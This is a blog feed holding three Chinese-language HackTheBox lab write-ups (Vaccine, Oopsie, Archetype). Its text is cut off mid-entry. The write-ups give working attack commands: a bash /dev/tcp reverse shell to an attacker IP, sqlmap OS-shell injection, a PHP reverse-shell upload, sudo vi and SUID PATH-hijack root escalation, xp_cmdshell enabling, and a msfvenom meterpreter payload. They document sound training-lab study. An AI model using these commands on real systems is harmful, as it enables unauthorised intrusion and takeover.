<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Nuyoahのblog</title>
  <icon>https://www.gravatar.com/avatar/933c9de452532a7b852d94b374f68331</icon>
  <subtitle>莫三天打鱼两天晒网</subtitle>
  <link href="https://isnuyoah.github.io/atom.xml" rel="self"/>
  
  <link href="https://isnuyoah.github.io/"/>
  <updated>2025-08-04T04:27:14.560Z</updated>
  <id>https://isnuyoah.github.io/</id>
  
  <author>
    <name>Nuyoah</name>
    <email>3287828082@qq.com</email>
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>[HTB] Vaccine 渗透测试笔记</title>
    <link href="https://isnuyoah.github.io/posts/2d3e4f5a.html"/>
    <id>https://isnuyoah.github.io/posts/2d3e4f5a.html</id>
    <published>2025-08-04T02:00:00.000Z</published>
    <updated>2025-08-04T04:27:14.560Z</updated>
    
    <content type="html"><![CDATA[<h1 id="HTB-Vaccine-靶机渗透实战"><a href="#HTB-Vaccine-靶机渗透实战" class="headerlink" title="HTB Vaccine 靶机渗透实战"></a>HTB Vaccine 靶机渗透实战</h1><h2 id="目标靶机信息"><a href="#目标靶机信息" class="headerlink" title="目标靶机信息"></a>目标靶机信息</h2><p><img src="/img/htb/vaccine/2025-08-04-01.webp" alt="vaccine 靶机"><br><img src="/img/htb/vaccine/2025-08-04-02.webp" alt="vaccine 靶机IP"></p><ul><li>靶机IP: 10.129.10.233</li></ul><h2 id="一、端口扫描"><a href="#一、端口扫描" class="headerlink" title="一、端口扫描"></a>一、端口扫描</h2><p>使用 Nmap 进行端口扫描，发现以下开放端口：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -p- 10.129.10.233</span><br></pre></td></tr></table></figure><br><img src="/img/htb/vaccine/2025-08-04-03.webp" alt="vaccine 靶机端口扫描结果"></p><h3 id="1-端口扫描结果分析"><a href="#1-端口扫描结果分析" class="headerlink" title="1. 端口扫描结果分析"></a>1. 端口扫描结果分析</h3><ul><li>21/tcp   open  ftp     vsftpd 3.0.3</li><li>22/tcp   open  ssh    OpenSSH 8.0</li><li>80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))</li></ul><p>其中21端口发现ftp服务，想起来之前靶场有过ftp匿名登陆的情况，尝试使用匿名登陆。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp 10.129.10.233</span><br></pre></td></tr></table></figure><br><img src="/img/htb/vaccine/2025-08-04-04.webp" alt="ftp匿名登陆"></p><h3 id="2-通过ftp获取文件"><a href="#2-通过ftp获取文件" class="headerlink" title="2. 通过ftp获取文件"></a>2. 通过ftp获取文件</h3><p>成功登陆后查看目录<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -al</span><br></pre></td></tr></table></figure><br><img src="/img/htb/vaccine/2025-08-04-13.webp" alt="ftp目录"></p><p>把backup.zip下载下来<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get backup.zip</span><br></pre></td></tr></table></figure><br>尝试解压backup.zip文件时需要密码<br>使用John the Ripper对zip文件进行破解<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zip2john backup.zip &gt; zippedzip.txt</span><br><span class="line">john zippedzip.txt</span><br></pre></td></tr></table></figure><br><img src="/img/htb/vaccine/2025-08-04-15.webp" alt="zip密码破解"></p><p>再次解压缩backup.zip，获得两个文件style.css和index.php</p><p>使用cat查看index.php文件内容<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> index.php</span><br></pre></td></tr></table></figure><br><img src="/img/htb/vaccine/2025-08-04-16.webp" alt="index.php内容"><br>发现管理员admin和md5加密的密文，使用在线网站解密解密获得密码<br><img src="/img/htb/vaccine/2025-08-04-05.webp" alt="md5解密"></p><h2 id="二、web漏洞利用，SQL注入"><a href="#二、web漏洞利用，SQL注入" class="headerlink" title="二、web漏洞利用，SQL注入"></a>二、web漏洞利用，SQL注入</h2><p>在拥有了账号admin和密码后，访问靶机的80端口，进入Web界面<br><img src="/img/htb/vaccine/2025-08-04-06.webp" alt="vaccine web界面"><br>在search框口输入1，发现url内有id参数，f12后发现PHPSESSID和value，怀疑存在SQL注入漏洞，接下来使用sqlmap进行测试<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://10.129.10.233/dashboard.php?search=py&quot;</span> \</span><br><span class="line">--cookie <span class="string">&quot;PHPSESSID=xxxxxxxxx&quot;</span> \</span><br><span class="line">--flush-session \  <span class="comment">#清除当前会话数据，确保开始一个新的扫描会话，避免冲突</span></span><br><span class="line">--os-shell <span class="comment">#SQL注入打开一个命令行</span></span><br></pre></td></tr></table></figure></p><p><img src="/img/htb/vaccine/2025-08-04-17.webp" alt="sqlmap测试"><br><img src="/img/htb/vaccine/2025-08-04-12.webp" alt="sqlmap测试结果"></p><p>成功获取到os shell。<br>接下来利用反向shell以postgres shell连接<br>使用nc命令监听8888端口<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 8888</span><br></pre></td></tr></table></figure><br>在sqlmap的os shell中执行以下命令，建立反向shell连接<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/10.10.16.6/8888 0&gt;&amp;1&#x27;</span></span><br></pre></td></tr></table></figure><br><img src="/img/htb/vaccine/2025-08-04-07.webp" alt="反向shell连接"></p><h2 id="三、提权"><a href="#三、提权" class="headerlink" title="三、提权"></a>三、提权</h2><h3 id="1-提权至postgres用户"><a href="#1-提权至postgres用户" class="headerlink" title="1. 提权至postgres用户"></a>1. 提权至postgres用户</h3><p>在反向shell中，找www目录下的文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/www/html</span><br><span class="line"><span class="built_in">ls</span> -al</span><br></pre></td></tr></table></figure><br><img src="/img/htb/vaccine/2025-08-04-07.webp" alt="www目录"></p><p>发现名为dashboard.php的文件，查看该文件内容<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> dashboard.php | grep pass <span class="comment">#过滤出包含pass的行</span></span><br></pre></td></tr></table></figure><br>发现了postgres用户的密码</p><p>接下来可以使用python脚本进行提权<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"><span class="built_in">sudo</span> -l <span class="comment">#显示当前用户可以作为超级用户执行的命令列表</span></span><br></pre></td></tr></table></figure><br>但是我的命令框经常自动关闭，显示会话died，<br>想起来该靶机开放了22端口，尝试ssh登陆</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh postgres@10.129.10.233</span><br></pre></td></tr></table></figure><p>输入密码后成功登陆<br><img src="/img/htb/vaccine/2025-08-04-10.webp" alt="ssh登陆"></p><p>成功提权至ostgres用户</p><h3 id="2-提权至root"><a href="#2-提权至root" class="headerlink" title="2. 提权至root"></a>2. 提权至root</h3><p>接下来使用sudo -l命令,发现了/bin/vi 是可以使用特定 pg_hba.conf 文件运行的程序，于是执行<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> /bin/vi /etc/postgresql/11/main/pg_hba.conf</span><br><span class="line">:!/bin/bash</span><br></pre></td></tr></table></figure></p><p>成功提权到root权限<br><img src="img/htb/vaccine/2025-08-04-08.webp" alt="root权限"></p><h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><p>在本次 HTB Vaccine 靶机渗透中，依次利用了 FTP 匿名登录 → 获取源码与凭据 → Web 登录 → SQL 注入获取 OS Shell → 反弹 Shell → SSH 登录 → sudo 提权 的完整攻击链。</p>]]></content>
    
    
    <summary type="html">HackTheBox:Vaccine 靶场的完整渗透流程，包括信息收集、FTP匿名登陆、SQL注入、SSH提权等步骤。 在本次测试中，寻找web漏洞要检查cookie、session等信息，搞清楚访问控制如何工作的。</summary>
    
    
    
    <category term="htb" scheme="https://isnuyoah.github.io/categories/htb/"/>
    
    
    <category term="HTB" scheme="https://isnuyoah.github.io/tags/HTB/"/>
    
    <category term="靶场渗透测试" scheme="https://isnuyoah.github.io/tags/%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="ftp匿名登陆" scheme="https://isnuyoah.github.io/tags/ftp%E5%8C%BF%E5%90%8D%E7%99%BB%E9%99%86/"/>
    
    <category term="SQL注入" scheme="https://isnuyoah.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
    <category term="ssh提权" scheme="https://isnuyoah.github.io/tags/ssh%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>[HTB] Oopsie 渗透测试笔记</title>
    <link href="https://isnuyoah.github.io/posts/1c2d3e4f.html"/>
    <id>https://isnuyoah.github.io/posts/1c2d3e4f.html</id>
    <published>2025-08-03T04:00:00.000Z</published>
    <updated>2025-08-04T04:27:14.560Z</updated>
    
    <content type="html"><![CDATA[<h1 id="HackTheBox-Oopsie-靶场的完整渗透流程"><a href="#HackTheBox-Oopsie-靶场的完整渗透流程" class="headerlink" title="HackTheBox:Oopsie 靶场的完整渗透流程"></a>HackTheBox:Oopsie 靶场的完整渗透流程</h1><p><img src="/img/htb/oopsie/1754180918-03.webp" alt="Oopsie 靶场"><br><img src="/img/htb/oopsie/1754180955-04.webp" alt="Oopsie 靶场信息"></p><h2 id="一、端口扫描"><a href="#一、端口扫描" class="headerlink" title="一、端口扫描"></a>一、端口扫描</h2><p>使用 Nmap 进行端口扫描，发现以下开放端口：<br>22/tcp   open  ssh<br>80/tcp   open  http Apache httpd 2.4.29 ((Ubuntu))</p><p><img src="/img/htb/oopsie/1754181306-05.webp" alt="Oopsie 靶场端口扫描结果"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -T4 -sV -Pn 10.129.95.191</span><br></pre></td></tr></table></figure><h2 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h2><h3 id="1-根据端口扫描结果，访问-HTTP-服务"><a href="#1-根据端口扫描结果，访问-HTTP-服务" class="headerlink" title="1.根据端口扫描结果，访问 HTTP 服务"></a>1.根据端口扫描结果，访问 HTTP 服务</h3><p>根据提示发现需要找login页面，f12查看源代码发现路径<br><img src="/img/htb/oopsie/1754181826-06.webp" alt="Oopsie 靶场登录页面路径"></p><p>成功访问页面<br><img src="/img/htb/oopsie/1754181894-07.webp" alt="Oopsie 靶场登录页面"></p><p>尝试了弱口令爆破没有成功，使用以游客身份登陆进一步获取信息</p><h2 id="三、获取用户权限"><a href="#三、获取用户权限" class="headerlink" title="三、获取用户权限"></a>三、获取用户权限</h2><h3 id="1-使用-BurpSuite-代理抓包，获得管理员id和username"><a href="#1-使用-BurpSuite-代理抓包，获得管理员id和username" class="headerlink" title="1.使用 BurpSuite 代理抓包，获得管理员id和username"></a>1.使用 BurpSuite 代理抓包，获得管理员id和username</h3><p>以游客身份登陆进去后，在Account模块发现id传包，于是使用 BurpSuite 代理抓包，并遍历id<br><img src="/img/htb/oopsie/1754183442-10.webp" alt="Oopsie 靶场抓包遍历结果">、<br>发现了admin和super admin<br>之后使用super admin放包<br><img src="/img/htb/oopsie/1754183739-13.webp" alt="Oopsie 靶场放包"><br>successfully!</p><p>之后根据靶场要求使用upload功能上传文件。<br>发现以游客身份无法上传<br><img src="/img/htb/oopsie/1754182243-08.webp" alt="Oopsie 靶场上传文件"></p><p>于是根据之前的抓包过程，先进行uploads页面抓包，修改为super admin的id和username然后放包，成功访问该模块<br><img src="/img/htb/oopsie/1754183788-14.webp" alt="Oopsie 靶场上传页面"></p><h3 id="2-上传反弹shell文件"><a href="#2-上传反弹shell文件" class="headerlink" title="2.上传反弹shell文件"></a>2.上传反弹shell文件</h3><p>首先找upload上传路径，使用gobuster进行目录爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -u http://10.129.95.191 -w /usr/share/wordlists/dirb/common.txt -t 50</span><br></pre></td></tr></table></figure><p>发现是uploads文件夹</p><p>准备php反弹shell文件。<br>这里我使用kali自带的php-reverse-shell.php文件<br><img src="/img/htb/oopsie/1.webp" alt="Oopsie 靶场上传反弹shell文件"></p><p>接下来修改监听ip和端口<br><img src="/img/htb/oopsie/1754184067-15.webp" alt="Oopsie 靶场修改监听IP和端口"></p><details><summary>⚠ 错误提示，点击查看</summary>注意**上图修改的端口最好使用8888**，因为我这里使用4444端口失败了，chatgpt给的是可能被靶机防火墙规则封掉了</details><details><summary>📌 Vim 简单使用速查表（点击展开）</summary>## 1. 进入和退出 Vim<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim filename        <span class="comment"># 打开或新建文件</span></span><br><span class="line">i                   <span class="comment"># 进入插入模式</span></span><br><span class="line">Esc                 <span class="comment"># 退出插入模式</span></span><br></pre></td></tr></table></figure>## 2. 保存和退出<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">:q                   <span class="comment"># 退出 Vim</span></span><br><span class="line">:q!                <span class="comment"># 强制退出 Vim</span></span><br><span class="line">:w                   <span class="comment"># 保存文件</span></span><br><span class="line">:wq                  <span class="comment"># 保存并退出 Vim</span></span><br></pre></td></tr></table></figure>## 3. 编辑文本<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">x                   <span class="comment"># 删除光标所在字符</span></span><br><span class="line"><span class="built_in">dd</span>                  <span class="comment"># 删除当前行  </span></span><br><span class="line">yy                  <span class="comment"># 复制当前行</span></span><br><span class="line">p                   <span class="comment"># 粘贴复制的行</span></span><br><span class="line">u                   <span class="comment"># 撤销上一步操作</span></span><br><span class="line">Ctrl + r            <span class="comment"># 重做上一步操作</span></span><br></pre></td></tr></table></figure></details><p>修改成自己的监听IP和端口后，使用nc监听<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 8888</span><br></pre></td></tr></table></figure><br><strong>在上传过程中依然要抓包修改cookie</strong><br>提示上传成功<br><img src="/img/htb/oopsie/1754184176-16.webp" alt="Oopsie 靶场上传成功"></p><h3 id="3-使用curl触发反弹shell"><a href="#3-使用curl触发反弹shell" class="headerlink" title="3. 使用curl触发反弹shell"></a>3. 使用curl触发反弹shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.129.95.191/uploads/phpshell.php</span><br></pre></td></tr></table></figure><p><img src="/img/htb/oopsie/1754185748-18.webp" alt="Oopsie 靶场触发反弹shell"><br><img src="/img/htb/oopsie/1754186609-19.webp" alt="whoami"><br>成功获取shell</p><h2 id="四、提权"><a href="#四、提权" class="headerlink" title="四、提权"></a>四、提权</h2><h3 id="1-提升为terminal-shell"><a href="#1-提升为terminal-shell" class="headerlink" title="1. 提升为terminal shell"></a>1. 提升为terminal shell</h3><p>之前获得到的是一个php shell，并不能算是终端，需要做一下升级</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 常用升级方法</span></span><br><span class="line">python3 -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"><span class="built_in">export</span> TERM=xterm</span><br><span class="line">Ctrl + Z                <span class="comment"># 挂起当前会话</span></span><br><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span>; <span class="built_in">fg</span>      <span class="comment"># 恢复会话</span></span><br><span class="line">reset</span><br></pre></td></tr></table></figure><h3 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2. 信息收集"></a>2. 信息收集</h3><p>使用linux命令查看cdn-cgi/login目录内部文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -la /var/www/html/cdn-cgi/login</span><br></pre></td></tr></table></figure></p><p>发现db.php文件<br>怀疑内部有数据库连接信息<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /var/www/html/cdn-cgi/login/db.php</span><br></pre></td></tr></table></figure></p><p>提权以robert用户身份登录<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su robert</span><br></pre></td></tr></table></figure></p><p><img src="/img/htb/oopsie/2.webp" alt="Oopsie 靶场robert提权成功"></p><p>查看目录<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -la</span><br></pre></td></tr></table></figure></p><p>查找当前用户id,组id以及所属的group<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">id</span></span><br></pre></td></tr></table></figure><br><img src="/img/htb/oopsie/3.webp" alt="Oopsie 靶场robert用户信息"></p><p>查找属于该group的全部文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -group bugtracker 2&gt;/dev/null</span><br></pre></td></tr></table></figure><br><img src="/img/htb/oopsie/3.webp" alt="Oopsie 靶场查找bugtracker组文件"></p><p>发现只有一个/usr/bin/bugtracker文件</p><p>查看该文件权限和详细信息<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -la /usr/bin/bugtracker</span><br></pre></td></tr></table></figure></p><p>发现该文件是一个涉及到SUID方面的文件</p><details><summary>🔍 关于 SUID</summary>SUID（Set User ID）是一个特殊的文件权限位，当一个可执行文件被设置了 SUID 位时，任何用户运行该文件时，都会以文件所有者的权限来执行，而不是以运行该文件的用户的权限来执行。这通常用于允许普通用户执行需要更高权限的程序。</details><p>执行该文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/bugtracker</span><br></pre></td></tr></table></figure></p><p><img src="/img/htb/oopsie/4.webp" alt="Oopsie 靶场执行bugtracker文件"></p><p>这里直接输入root.txt文件路径发现能直接获取root的flag<br>但是依然没有获取到root权限，所以我尝试利用该文件获取.ssh/id_rsa文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/bugtracker </span><br><span class="line">/root/.ssh/id_rsa</span><br></pre></td></tr></table></figure><br><img src="/img/htb/oopsie/5.webp" alt="Oopsie 靶场获取id_rsa文件"><br>但是如上图失败了，个人推测可能是该文件不存在（大概率），或者权限不足</p><h3 id="3-使用PATH劫持提权"><a href="#3-使用PATH劫持提权" class="headerlink" title="3. 使用PATH劫持提权"></a>3. 使用PATH劫持提权</h3><details><summary>PATH劫持的原理</summary>利用了 /usr/bin/bugtracker 这个程序是 setuid root 并且在代码里直接调用了 cat，但没有用绝对路径。</details><p>在/tmp创建假的cat程序</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;/bin/sh&#x27;</span> &gt; /tmp/cat</span><br><span class="line"><span class="built_in">chmod</span> +x /tmp/cat</span><br><span class="line"><span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span> <span class="comment">#将/tmp放在PATH最前面</span></span><br></pre></td></tr></table></figure><p>执行bugtracker程序</p><p><img src="/img/htb/oopsie/1754188737-21.webp" alt="Oopsie 利用PATH劫持提权"></p><p>成功获取最高root权限！<br>参考: <a href="https://xsh.asia/2024/12/19/Hack-The-Box-Oopsie/">Hack-The-Box Oopsie</a> 的分析</p><h2 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h2><p>在本次测试中，在执行反弹shell时候，有时候文件上传成功一次，但有时候需要多次尝试才能成功。这可能与靶场的防护机制有关，需要根据实际情况灵活应对。<br>上传的 php-reverse-shell.php 会在被访问（curl）时，立刻执行 system() 反弹到监听端口，然后 PHP 脚本结束，进程销毁。当第二次 curl 时，如果服务器的 PHP 环境不允许重复执行某些脚本（比如缓存、会话锁），可能就不触发。</p><p>这也是我第一次遇到通过PATH劫持提权的情况，非常有助于拓展提权思路</p><p>每一次突破权限，都是跨越认知的藩篱；每一次失败，都是积蓄下一次成功的力量！</p>]]></content>
    
    
    <summary type="html">HackTheBox:Oopsie 靶场的完整渗透流程，包括信息收集、BurpSuite 代理抓包、文件上传漏洞利用、SUID 提权等步骤。 在本次测试中，寻找web漏洞要检查cookie、session等信息，搞清楚访问控制如何工作的。</summary>
    
    
    
    <category term="htb" scheme="https://isnuyoah.github.io/categories/htb/"/>
    
    
  </entry>
  
  <entry>
    <title>[HTB] Archetype 渗透测试笔记</title>
    <link href="https://isnuyoah.github.io/posts/98873ddf.html"/>
    <id>https://isnuyoah.github.io/posts/98873ddf.html</id>
    <published>2025-08-01T10:30:00.000Z</published>
    <updated>2025-08-04T04:27:14.560Z</updated>
    
    <content type="html"><![CDATA[<h1 id="HackTheBox-Archetype-靶场的完整渗透流程"><a href="#HackTheBox-Archetype-靶场的完整渗透流程" class="headerlink" title="HackTheBox:Archetype 靶场的完整渗透流程"></a>HackTheBox:Archetype 靶场的完整渗透流程</h1><h2 id="一、端口扫描"><a href="#一、端口扫描" class="headerlink" title="一、端口扫描"></a>一、端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -T4 -sV -Pn 10.129.75.207</span><br></pre></td></tr></table></figure><p><img src="/img/htb/archetype/1754037816.webp" alt="nmap扫描"></p><h3 id="445是smb-共享文件协议-端口，在未配置权限情况下可能允许匿名访问共享文件夹。"><a href="#445是smb-共享文件协议-端口，在未配置权限情况下可能允许匿名访问共享文件夹。" class="headerlink" title="445是smb(共享文件协议)端口，在未配置权限情况下可能允许匿名访问共享文件夹。"></a>445是smb(共享文件协议)端口，在未配置权限情况下可能允许匿名访问共享文件夹。</h3><h2 id="二、SMB-信息收集"><a href="#二、SMB-信息收集" class="headerlink" title="二、SMB 信息收集"></a>二、SMB 信息收集</h2><h3 id="尝试空密码进行SMB登陆"><a href="#尝试空密码进行SMB登陆" class="headerlink" title="尝试空密码进行SMB登陆"></a>尝试空密码进行SMB登陆</h3><h3 id="1-L表示列出共享资源"><a href="#1-L表示列出共享资源" class="headerlink" title="1. -L表示列出共享资源"></a>1. -L表示列出共享资源</h3><h3 id="2-N表示不使用密码"><a href="#2-N表示不使用密码" class="headerlink" title="2. -N表示不使用密码"></a>2. -N表示不使用密码</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L -N //10.129.75.207/</span><br></pre></td></tr></table></figure><p><img src="/img/htb/archetype/1754038484.webp" alt="SMB登陆"></p><h3 id="发现backups目录"><a href="#发现backups目录" class="headerlink" title="发现backups目录"></a>发现backups目录</h3><h3 id="SMB连接并列出目录内容，下载有用文件"><a href="#SMB连接并列出目录内容，下载有用文件" class="headerlink" title="SMB连接并列出目录内容，下载有用文件"></a>SMB连接并列出目录内容，下载有用文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.129.75.207/backups -N</span><br><span class="line">smb: \&gt; <span class="built_in">ls</span></span><br><span class="line">smb: \&gt; get prod.dtsConfig</span><br></pre></td></tr></table></figure><p><img src="/img/htb/archetype/1754038500.webp" alt="下载文件"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> prod.dtsConfig</span><br></pre></td></tr></table></figure><h3 id="发现账号密码"><a href="#发现账号密码" class="headerlink" title="发现账号密码"></a>发现账号密码</h3><p><img src="/img/htb/archetype/1754038520.webp" alt="prod.dtsConfig内容"></p><h2 id="三、MSSQL-利用"><a href="#三、MSSQL-利用" class="headerlink" title="三、MSSQL 利用"></a>三、MSSQL 利用</h2><h3 id="1-使用网络协议包impacket中的mssqlclient连接SQL-server-服务器"><a href="#1-使用网络协议包impacket中的mssqlclient连接SQL-server-服务器" class="headerlink" title="1.使用网络协议包impacket中的mssqlclient连接SQL server 服务器"></a>1.使用网络协议包impacket中的mssqlclient连接SQL server 服务器</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-mssqlclient -windows-auth ARCHETYPE/sql_svc@10.129.75.207</span><br></pre></td></tr></table></figure><p><img src="/img/htb/archetype/1754039411.webp" alt="连接SQL server"></p><h3 id="同时检查数据库权限"><a href="#同时检查数据库权限" class="headerlink" title="同时检查数据库权限"></a>同时检查数据库权限</h3><details><summary>⚠ 易错提示，点击查看</summary>注意这里的 `/` 不能写成 `\`，  正确：`ARCHETYPE/sql_svc@10.129.75.207`  错误：`ARCHETYPE\sql_svc@10.129.75.207`（会导致连接失败）</details><h2 id="四、获取shell"><a href="#四、获取shell" class="headerlink" title="四、获取shell"></a>四、获取shell</h2><h3 id="1-使用xp-cmdshell执行命令"><a href="#1-使用xp-cmdshell执行命令" class="headerlink" title="1. 使用xp_cmdshell执行命令"></a>1. 使用xp_cmdshell执行命令</h3><details><summary>💡 关于 xp_cmdshell</summary>`xp_cmdshell` 是 SQL Server 内置的扩展存储过程，允许直接在数据库中执行系统命令（调用 Windows 命令行解释器）。  它的常见用途包括：- 执行系统级脚本- 下载文件- 启动其他程序如果数据库账号有高权限（如 `sysadmin`），攻击者可以利用 `xp_cmdshell` 在目标系统上执行任意命令，从而直接拿到系统权限。</details><h3 id="我们需要修改配置"><a href="#我们需要修改配置" class="headerlink" title="我们需要修改配置"></a>我们需要修改配置</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, <span class="number">1</span>;</span><br><span class="line">RECONFIGURE;</span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>, <span class="number">1</span>;</span><br><span class="line">RECONFIGURE;</span><br></pre></td></tr></table></figure><h3 id="执行命令成功后检查"><a href="#执行命令成功后检查" class="headerlink" title="执行命令成功后检查"></a>执行命令成功后检查</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> xp_cmdshell <span class="string">&#x27;whoami&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="/img/htb/archetype/1754039426.webp" alt="执行whoami"></p><h3 id="2-利用msf生成exe上传并执行"><a href="#2-利用msf生成exe上传并执行" class="headerlink" title="2. 利用msf生成exe上传并执行"></a>2. 利用msf生成exe上传并执行</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.34 LPORT=4444 -f exe -o shell.exe</span><br></pre></td></tr></table></figure><h3 id="启动http服务，开启8000端口"><a href="#启动http服务，开启8000端口" class="headerlink" title="启动http服务，开启8000端口"></a>启动http服务，开启8000端口</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8000</span><br></pre></td></tr></table></figure><p><img src="/img/htb/archetype/1754044233.webp" alt="生成exe,启动http"></p><h3 id="3-通过mssql下载到可下载目录下"><a href="#3-通过mssql下载到可下载目录下" class="headerlink" title="3. 通过mssql下载到可下载目录下"></a>3. 通过mssql下载到可下载目录下</h3><figure class="highlight sql"><table><tr><td 